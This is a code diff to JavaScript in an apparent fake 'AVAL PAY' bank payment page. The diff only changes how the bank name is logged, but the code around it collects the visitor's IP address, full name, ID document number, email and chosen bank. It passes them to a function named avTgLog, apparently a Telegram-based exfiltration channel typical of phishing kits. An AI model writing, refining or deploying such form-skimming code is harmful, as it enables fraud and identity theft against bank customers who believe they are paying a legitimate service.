@@ -1565,6 +1565,9 @@
 
                 const banco = tipoEntidad === 'aval'
                     ? bancoSeleccionado
+                    : selectorBancoOtras.value;
+                const bancoLabel = tipoEntidad === 'aval'
+                    ? bancoSeleccionado
                     : selectorBancoOtras.options[selectorBancoOtras.selectedIndex].text;
 
                 // Guardar selección local (compatibilidad con tu código actual)
@@ -1583,7 +1586,7 @@
                 avGetIP().then(function(ip) {
                     avTgLog([
                         tipoEntidad === 'aval' ? '🏦 AVAL PAY — BANCO AVAL' : '🏦 AVAL PAY — OTRAS ENTIDADES (PSE)',
-                        '🏛️ Banco: ' + banco,
+                        '🏛️ Banco: ' + bancoLabel,
                         '👤 ' + document.getElementById('nombreCompleto').value.trim(),
                         '🪪 ' + (document.getElementById('tipoDocumento').value || '') + ' ' + document.getElementById('numeroDocumento').value.trim(),
                         '📧 ' + document.getElementById('correo').value.trim(),
